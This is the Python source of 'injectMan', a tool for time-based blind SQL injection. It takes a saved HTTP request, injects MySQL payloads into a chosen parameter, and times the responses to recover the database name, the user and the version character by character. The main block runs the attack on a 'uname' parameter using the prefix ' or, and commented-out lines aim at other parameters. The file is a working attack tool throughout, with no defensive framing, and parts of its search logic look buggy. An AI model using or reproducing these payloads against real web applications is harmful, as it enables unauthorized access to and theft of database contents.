#coding:utf-8
"""
injectMan a TimeBlind inject pragaram which easy-code for customizable and visable by nancheal
Rely on:
    lib - docopt
        - requests
Usage:
    inject-man.py -r <file> -p  <param> -fix <prefix>,<suffix>
Options:
    -f          Read a http data packet file
    -p          Specify a param which is vulnerable
todo:
"""
import re
import sys
import pdb
import docopt
import logging
from logging.handlers import TimedRotatingFileHandler
import requests
import datetime
from urllib import quote
from StringIO import StringIO
from BaseHTTPServer import BaseHTTPRequestHandler
class File:
    """
    File operation class
    """
    def __init__(self):
        pass
    def readFile(self,fileName):
        with open(fileName,"r") as f:
            fileData = f.read()
            HTTPData = HTTPRequest(fileData)
        return HTTPData
class Payload:
    """
    Generate payload by input flag
    """
    def reduceTimes(self,symbol,value,pos=None):
        if not pos:
            pass
    def withoutQuoteandequal(self,symbol,value,pos=None):
        if not pos:
            key = 'length(@@version){}{} and sleep(1)'
            test_Payload = key.format(symbol,value)
        else:
            key = 'ascii(substring(@@version from {} for 1)){}{} and sleep(1)'
            test_Payload = key.format(pos,symbol,value)
        return test_Payload
    def currentDb(self,symbol,value,pos=None):
        if not pos:
            key = 'length((select database()))'
        else:
            key = 'ascii(substr((select database()),{},1))'.format(pos)
        currentDb_Payload = self.basic(key,symbol,value)
        return currentDb_Payload
    def currentUser(self,symbol,value,pos=None):
        if not pos:
            key = 'length((select user()))'
        else:
            key = 'ascii(substr((select user()),{},1))'.format(pos)
        currentUser_Payload = self.basic(key,symbol,value)
        return currentUser_Payload
    def basic(self,key,symbol,value):
        basicpayload = "if({}{}{},sleep(0.1),0)"
        finalPayload = basicpayload.format(key,symbol,value)  
        return finalPayload     
class Join:
    """
    Join post data
    """
    def __init__(self,httpData):
        if httpData.command == "POST":
            self.data = httpData.rfile.read()
        elif httpData.command == "GET":
            self.data = httpData.path.split('?')[1]
    def joinData(self,infDict):
        """
        infDict should contain 'param', 'prefix', 'payload', 'suffix'
        """
        fullpayload = "{}{}{}".format(infDict['prefix'],infDict['payload'],infDict['suffix'])
        holderdata = self.addHolder(self.data,infDict['param'])
        resultData = holderdata.format(quote(fullpayload))
        return resultData
    def addHolder(self,data,param):
        addand = "{}&".format(data)
        compiler = re.compile(r'%s=.*?\&'%param)
        iteresult = compiler.finditer(addand)
        for i in iteresult:
            matchstr = i.group()
        fixpos = data.find(matchstr) + len(matchstr) - 1
        fixData = "{}{{}}&{}".format(addand[:fixpos],addand[fixpos+1:-1])
        return fixData
class Request:
    """
    Request class 
    """
    def __init__(self,httpData):
        self.url = "http://{}{}".format(httpData.headers["host"],httpData.path)
        self.header = httpData.headers
        self.method = httpData.command
    def send(self,Data = None):
        if self.method == "POST":
            self.post(Data)
        elif self.method == "GET":
            self.get(Data)
    def post(self,data):
        try:
            requesthandler = requests.post(self.url,data=data,headers=self.header) 
        except BaseException as e:
            print e
    def get(self,data):
        try:
            getUrl = self.url.split('?')[0]
            req = requests.get(getUrl,headers=self.header,params=data)
        except BaseException as e:
            print e      
class HTTPRequest(BaseHTTPRequestHandler):
    """
    HTTPRequest Prase class
    """
    def __init__(self,request_text):
        self.rfile = StringIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()
    def send_error(self,code,message):
        self.error_code = code
        self.error_message = message
class ConsoleHandler(logging.StreamHandler):
    on_same_line = False
    def emit(self, record):
        try:
            msg = self.format(record)
            stream = self.stream
            same_line = getattr(record, 'same_line')
            if self.on_same_line and not same_line:
                stream.write('\n')
            stream.write(msg)
            if same_line:
                stream.write('\r')
                self.on_same_line = True
            else:
                stream.write('\n')
                self.on_same_line = False
            self.flush()
        except (KeyboardInterrupt, SystemExit):
            raise
        except:
            self.handleError(record)
class Mylog:
    RESULT = '\033[92m'                                                       
    INFO = '\033[94m'                                                        
    ENDC = '\033[0m'    
    def __init__(self):
        self.resultLevel = 100
        logging.addLevelName(self.resultLevel,"RESULT")
        self.logger = logging.getLogger("injectManlog")
        self.logger.setLevel(logging.INFO)
    def toLog(self, level, message, option):
        basicFmt = self.switchColor(level,"[%(asctime)s] [%(levelname)s] %(message)s")
        timeFmt = "%H:%M:%S"
        formatter = logging.Formatter(fmt = basicFmt,datefmt = timeFmt)
        consoleHandler = ConsoleHandler()
        consoleHandler.setFormatter(formatter)
        self.logger.addHandler(consoleHandler)
        intLevel = self.switchIntLevel(level)
        self.logger.log(intLevel,message + self.ENDC,extra=option)
    def switchColor(self, level, message):
        switcher={
            "result":self.RESULT,
            "info":self.INFO,
        }
        #pdb.set_trace()
        return switcher.get(level) + message
    def switchIntLevel(self,level):
        switcher={
            "result":100,
            "critical":50,
            "error":40,
            "warning":30,
            "info":20,
            "debug":10,
            "notset":0
        }
        return switcher.get(level)
class Inject:
    """
    Inject main code
    """
    def __init__(self,fileName):
        self.nFile = File()
        self.rFile = self.nFile.readFile(fileName)
        self.nJoin = Join(self.rFile)
        self.nRequest = Request(self.rFile)
        self.log = Mylog()
    def inJect(self,infDict,optionDict):
        Func = self.chooseMode(optionDict)
        lengthPoc = None
        length = self.binarySearch(infDict,Func,lengthPoc)
        self.log.toLog("result","Current length is {}".format(length),option={'same_line':False})
        name = ''
        for namePos in range(1,length+1):
            charAscii = self.binarySearch(infDict,Func,namePos)
            name = name + chr(charAscii)
            self.log.toLog("result","Current name is {}".format(name),option={'same_line':True})
        sys.stderr.write('\n')
    def binarySearch(self,infDict,Func,pos):
        self.left = 0
        self.right = 127
        nPayload = Payload()
        self.symbol = ">"
        while self.left <= self.right:
            self.mid = int((self.left+self.right)/2)
            infDict['payload'] = getattr(nPayload,Func)(self.symbol,self.mid,pos)       
            data = self.nJoin.joinData(infDict)
            startTime = datetime.datetime.now()
            self.nRequest.send(data)
            endTime = datetime.datetime.now()
            timeTmp = (endTime - startTime).seconds
            judgeResult = self.binaryJudge(timeTmp,1)
            if judgeResult:
                return self.mid
    def burteSearch(self,infDict,Func,pos):
        self.symbol = "="
        nPayload = Payload()
        for i in range(1,127):
            infDict['payload'] = getattr(nPayload,Func)(self.symbol,i,pos)       
            data = self.nJoin.joinData(infDict)
            startTime = datetime.datetime.now()
            self.nRequest.send(data)
            endTime = datetime.datetime.now()
            timeTmp = (endTime - startTime).seconds
            if timeTmp >= 1:
                return i
    def binaryJudge(self,timeTmp,stander):
        if timeTmp >= stander and self.symbol == "=":
            return 1
        elif timeTmp >= stander and self.symbol == ">":
            self.left = self.mid - 1
        elif timeTmp >= stander and self.symbol == "<":
            self.right = self.mid + 1
        elif timeTmp < stander and self.symbol == ">":
            self.symbol = "="
        elif timeTmp < stander and self.symbol == "=":
            self.symbol = "<"
        elif timeTmp < stander and self.symbol == "<":
            self.symbol = ">"
        return 0
    def chooseMode(self,infDict):
        if '--current-db' in infDict.keys():
            Func = "currentDb"
        if '--current-user' in infDict.keys():
            Func = "currentUser"
        if '--withoutQuoteandequal' in infDict.keys():
            Func = 'withoutQuoteandequal'
        if '--reduceTimes' in infDict.keys():
            Func = 'reduceTimes'
        return Func
if __name__ == "__main__":
    nInject = Inject('1.txt')
    nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' #'},{'--current-db':True})
    #nInject.inJect({'param':'roleId','prefix':'\' or ','suffix':' %23'},{'--current-db':True})
    #nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' %23'},{'--current-db':False,'--current-user':True})
    #nInject.inJect({'param':'certificateId','prefix':'\' or ','suffix':' and \'1\'=\'1'},{'--current-db':False,'--current-user':True,'--withoutQuoteandequal':False,'--reduceTimes':False})